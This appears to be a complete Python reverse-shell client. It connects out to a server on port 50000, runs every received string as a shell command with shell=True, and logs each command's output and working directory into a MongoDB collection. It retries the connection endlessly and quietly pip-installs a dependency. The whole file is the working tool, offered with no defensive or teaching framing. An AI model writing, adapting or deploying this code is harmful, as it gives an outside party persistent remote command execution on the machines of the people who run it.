#!/usr/bin/env python3
import socket
import subprocess
import time
# import threading
from os import chdir, getcwd
import importlib.util

# since pymongo is not installed by default, it's better to check for it first
if not importlib.util.find_spec('pymongo'):
    subprocess.check_output("pip3 install pymongo", shell=True)

import pymongo


class ConnectionDBFailed(Exception):
    pass


class Client:
    def __init__(self, ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:27017/"):
        self.ip, self.port, self.db_link = ip, port, db_link
        self.conn = True
        self.myclient = pymongo.MongoClient(db_link)
        self.mydb = self.myclient[db_name]
        self.mycol = self.mydb[collection_name]

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.start()

    def msg_to_send(self, msg_to_db):
        # the dict makes sure that db has msgs in certain format
        msg_to_db_ = {"data": "", 'sender': 'client'}.copy()
        msg_to_db_['data'] = msg_to_db
        msg_to_db_['pwd'] = getcwd()
        msg_to_db_['client'] = self.s.getsockname()
        return msg_to_db_

    def start(self):
        """Start the connection, the loop of receiving and returning cwd start."""

        try:
            self.s.connect((self.ip, self.port))
        except (socket.error, ConnectionDBFailed):
            return

        self.s.settimeout(60)
        self.s.send(getcwd().encode()) # to let the server_ know the startup cwd.
        while True:  # to keep receiving
            try:
                msg_got = self.s.recv(1024).decode().strip()
                if msg_got == "CHECKING CONNNECTION":  # This message only sent to check the connection
                    continue

                if msg_got.startswith("cd "):  # easier to chdir
                    try:
                        chdir(msg_got[3:])
                    except FileNotFoundError:
                        print("NOt Found")
                out, error = subprocess.Popen(msg_got, shell=True, stdout=subprocess.PIPE,
                                              stderr=subprocess.PIPE).communicate()
                if out:
                    if len(out.decode().strip()) >= 1:
                        self.mycol.insert_one(self.msg_to_send(out.decode().strip()))
                    else:
                        self.mycol.insert_one(self.msg_to_send("command has no shown value"))
                else:
                    self.mycol.insert_one(self.msg_to_send(error.decode().strip()))

                self.s.send(getcwd().encode()) # last path after command, to keep server_ updated
            except (ConnectionDBFailed, socket.error):
                break


db_name = 'my_ref_db'
collection_name = 'data_got'

while True:
    Client(port=50000)
    time.sleep(2)
